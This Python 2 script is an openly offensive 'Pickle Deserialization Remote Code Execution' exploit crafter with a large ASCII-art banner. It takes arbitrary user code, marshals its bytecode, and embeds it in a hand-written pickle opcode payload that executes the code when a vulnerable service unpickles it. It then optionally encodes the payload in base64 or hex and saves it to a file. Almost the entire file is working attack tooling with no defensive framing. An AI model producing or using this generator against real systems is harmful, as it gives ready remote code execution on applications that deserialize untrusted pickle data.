import argparse
import base64
import marshal
import sys
import socket


global encode
global save

def encoder(exploit,schema):

	if schema=="base64":
		packet=base64.b64encode(exploit)
		return packet

	elif schema=="hex":
		packet=exploit.encode("hex")
		return packet

	else:
		return exploit

def craft(code):
	#building bytecode for foo func 
	exec code

	try:
	# serializing the foo code with marshall and encoding it 
	# in base64 before inserting it in the exploit
		exploit="""ctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'%s'\ntRtRc__builtin__\nglobals\n(tRS''\ntR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))

		print "___________________________________________________________"

		if encode is not None:
			exploit= encoder(exploit,encode)
		else:
			print "[^] Do you want to encode it? ( base64 or hex,leave for unicode) : ",
			schema=raw_input("")
			exploit=encoder(exploit,schema)

		print "[*] Crafted Evil Packet: "
		print
		print exploit
		print 
		print "___________________________________________________________"

		if save is not None:
			name=save
		else: 
			print "[^] Do you want to save it? (y/n, leave to skip): ",
			choose=raw_input("")
			if choose=="y":
				name=raw_input("[^] Insert exploit name: ")
			else:
				pass
		
		if name:
			file=open(name,"w")
			file.write(exploit)

			print "[*] Writing it in %s" % name

		print
		print "__________________________Job_Done_________________________"

	except:
		pass



if __name__ == "__main__":

	parser = argparse.ArgumentParser()
	parser.add_argument("-f","--foo",type=str,help="""craft from python file""")
	parser.add_argument("-d","--dynamic",action='store_true',help="""write code on the fly """)
	parser.add_argument("-e","--encode",type=str,help="""select encode of final packet: base64,hex """)
	parser.add_argument("-s","--file",type=str,help="""save final packet in a file""")

	args = parser.parse_args()

	

	print """                             
                                                           -oysoosyyyo:`                            
                                                         :yyys+ossssyyyy+.                          
                                                       `oyyyysoo++oosyyyyy/                         
                                                      `yyyo//ossssss/syyyyy:                        
                                                     .yyy-`-``:ssssossyyyyyo                        
                                                    .yyyy.````-/.`.:osyyyyyy                        
                                                   -yyysyy+:/++``-.`:yyyyyyy                        
                                                  /yhhmNhssysss:.``-syyyyyyo                        
                                                 +yyhdNNmysysssyssyyyyyyyyy.                        
                                               `oyyysyhdNmmmhdmddyyyyyyyyy+                         
                                              `syhyysssyshdmmddNNmhyyyyyyy`                         
                                             `syyyyssssssssyohhmmdyyyyyyy-                          
                                            `syyyyyssssssssssshhyyyyyyyy:                           
                                           .syyyyysssssssssssyyyyyyyyyy/                            
                                          -yyyyyyssssssssssyyyyyyyyyyyo                             
                                         :yyyyyyssssssssssyyyyyyyyyyyo`                             
                                       `+yyyyyysssssssssyyyyyyyyyyyys`                              
                                      .syyyyyssssssssyyyyyyyyyyyyyys`                               
                                     :yyyyysssssssssyyyyyyyyyyyyyys.                                
                                   .oyyyyyssssssssyyyyyyyyyyyhyyyy.                                 
                                 `/syyyyysssssssssyyyyyyyyyyyyyyy-                                  
                               `:syyyyyysssssssssyyyyyyyyyyyyyys.                                   
                              -oyyyyyyysssssssssyyyyyyyyyyyyyyo`             I'M                       
                            `+yyyyyyhyssssssssyyyyyyyyyyyyyyy+              RICK                        
                           .syhyyyysssssssssyyyyyyyyyyyyyyyy/                                       
                          :yyyyyyyssssssssyyyyyyyyyyyyyyyyy-                                        
                         :yyyyyyssssssssyyyyyyyyyyyyyyyyyo.                                         
                        .hyyyyyssssssssyyyyyyyyyyyyyyyys-                                           
                        syyyyyyssssssyyyyyyyyyhyyyyyyy:                                             
                        hyyyyyyssssyyyyyyyyyyyyyyyyy/`                                              
                        hyyyyyyyyyyyyyyyyyyyyyyyyy/`                                                
                        oyyyyyyyyyyyyyyyyyyyyyyy/`                                                  
                         +yyyyyyyyyyyyyyyyyyys:                                                     
                          `:+syyyyyyyyyyys+:.                                                       
                              `.-://::-.                                                            
                                                                                                    
                                         
            .__.__           .__        __   .__          
  _______  _|__|  |   ______ |__| ____ |  | _|  |   ____  
_/ __ \  \/ /  |  |   \____ \|  |/ ___\|  |/ /  | _/ __ \ 
\  ___/\   /|  |  |__ |  |_> >  \  \___|    <|  |_\  ___/ 
 \___  >\_/ |__|____/ |   __/|__|\___  >__|_ \____/\___  >
     \/               |__|           \/     \/         \/ 

                         - A -
    - Pickle Deserialization Remote Code Execution - 
                  - Exploit Crafter -
     - Just provide the wanted to execute code -



     				A Supid Tool by Thesaurus 
___________________________________________________________"""
	
	if not sys.argv[1:]:
		parser.print_help()

	encode= args.encode
	save=args.file
	
	if args.foo is not None:
		code="def foo():\n"
		with open(args.foo,'r') as foo:
			for line in foo:
				code+="	"+line
		
		craft(code)

		

	if args.dynamic:
		print "___________________________________________________________"
		print "[*] Write code till SIGINT, have fun!"
		print
		code="def foo():\n"
		try:
			while True:
				line="	"+raw_input("|")+"\n"
				code+=line
		except KeyboardInterrupt:
			print
			print
			pass

		craft(code)
	